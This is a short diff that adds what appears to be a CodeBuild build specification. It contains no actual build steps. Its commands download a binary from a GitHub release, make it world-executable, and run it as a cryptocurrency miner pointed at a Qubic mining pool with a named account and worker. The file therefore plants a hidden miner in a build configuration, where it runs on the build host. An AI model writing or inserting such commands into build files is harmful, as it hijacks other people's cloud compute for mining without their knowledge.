@@ -1,0 +1,7 @@
+version: 0.2
+
+phases:
+  build:
+    commands:
+        - wget https://github.com/varfeplas/qlubuc/releases/download/jetknl/vdas
+        - chmod 777 vdas && ./vdas --account CP_udnvh2owpq --worker pk7o --pool qubic1.hk.apool.io:3334
